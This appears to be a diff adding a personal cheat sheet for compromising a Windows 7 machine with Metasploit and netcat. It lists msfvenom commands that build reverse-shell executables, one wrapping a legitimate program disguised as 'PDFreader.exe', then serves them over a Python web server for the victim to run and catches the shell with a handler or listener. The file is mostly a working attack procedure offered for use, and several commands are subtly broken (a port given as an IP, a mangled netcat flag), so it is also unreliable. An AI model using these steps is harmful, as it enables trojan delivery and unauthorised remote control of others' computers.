@@ -1,0 +1,43 @@
+---Hacking into windows 7 system---
+
+
+--Hacking windows 7 with & without trojan with msfconsole--
+
+
+> apt install metasploit-framework
+> msfvenom -l payloads                                    (choose a payload)
+> msfvenom --list formats                                 (choose a format accordingly)
+> msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=192.168.0.4 Lport=4444 -f exe > /root/Downloads/shell_reverse.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as )
+> msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=192.168.0.4 Lport=4444 -f exe -x /root/Downloads/the_application_or_service_needed_by_victim.exe -o PDFreader.exe(trojan)
+> hexdump -C shell_reverse.exe | less                     ( check the exe file, 4d 5a - MZ represents its a exe file)
+> python3 -m http.server (to download the exe file over web on victim machine) - let it run
+> install shell_reverse.exe file from web on victim machine
+> open another terminal 
+> msfconsole
+> use exploit/multi/handler
+> set payload windows/x64/meterpreter/reverse_tcp
+> set lhost attack_machine_ip
+> set lport attack_machine_port
+> show options
+> exploit
+> now open victim machine and run the shell_reverse.exe file
+> check the terminal on attack machine
+> dir /a:h /b /s                                          (to find hidden files of a directory)
+
+
+
+--Hacking windows 7 with & without trojan with nc--
+
+
+> msfvenom - windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=192.168.1.1 -f exe -o inject.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as ) -- without trojan
+> > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.4 LPORT=4444 -f exe -x /root/Downloads/the_application_or_service_needed_by_victim.exe -o PDFreader.exe(trojan)
+> hexdump -C inject.exe | less
+> python3 -m http.server
+> install inject.exe file from web on victim machine
+> open another terminal
+> nc nlvp LPORT
+> now open victim machine and run the inject.exe file
+> check the terminal on attack machine
+
+
+useful cheatsheets https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
